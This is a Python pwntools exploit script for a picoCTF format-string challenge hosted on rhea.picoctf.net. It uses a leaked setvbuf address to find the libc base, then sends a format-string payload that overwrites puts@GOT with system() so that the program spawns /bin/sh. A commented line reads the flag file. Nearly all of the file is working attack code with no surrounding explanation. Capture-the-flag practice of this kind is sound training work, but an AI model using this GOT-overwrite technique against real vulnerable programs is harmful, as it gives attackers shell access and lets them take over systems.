from pwn import *

# === Setup ===
elf = context.binary = ELF('./format-string-3', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# === Config: Toggle local or remote ===
LOCAL = False
HOST = 'rhea.picoctf.net'
PORT = 50540

# === Start function ===
def start():
    if LOCAL:
        # For local testing with custom loader and libc
        return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './format-string-3'])
    else:
        return remote(HOST, PORT)

# === Begin exploit ===
p = start()

# === Leak setvbuf address ===
p.recvuntil(b'setvbuf in libc: ')
leaked_setvbuf = int(p.recvline().strip(), 16)
log.success(f"Leaked setvbuf address: {hex(leaked_setvbuf)}")

# === Calculate libc base and system() address ===
libc.address = leaked_setvbuf - libc.symbols['setvbuf']
system = libc.symbols['system']
log.success(f"Libc base: {hex(libc.address)}")
log.success(f"system() address: {hex(system)}")

# === Overwrite puts@GOT with system ===
puts_got = elf.got['puts']
log.info(f"puts@GOT address: {hex(puts_got)}")

# === Offset found via brute-force (%p spam or cyclic pattern) ===
offset = 38  # Verified working for local binary; adjust if needed

# === Format string payload ===
payload = fmtstr_payload(offset, {puts_got: system}, write_size='short')
p.sendline(payload)

# === Now when the binary calls puts("/bin/sh"), it becomes system("/bin/sh") ===

# === Optionally send command or shell after overwrite ===
# You can just wait for the system("/bin/sh") to trigger, OR use:
# p.sendline(b'cat flag.txt; id; exit')

# === Interactive shell ===
p.interactive()
